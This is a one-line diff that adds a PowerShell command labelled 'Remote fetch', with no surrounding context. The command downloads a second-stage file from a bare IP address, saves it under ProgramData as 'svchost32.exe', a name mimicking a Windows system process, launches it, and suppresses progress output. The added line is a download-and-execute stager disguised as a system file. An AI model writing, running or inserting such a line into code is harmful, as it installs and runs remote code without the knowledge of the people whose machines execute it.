@@ -1,0 +1,1 @@
+<# Remote fetch #> $PayloadUrl = 'https://203.0.113.229/stage2.ps1'; $PayloadPath = "C:\ProgramData\svchost32.exe"; curl.exe -s -L -o $PayloadPath $PayloadUrl; Start-Process -FilePath $PayloadPath; $ProgressPreference = "SilentlyContinue"
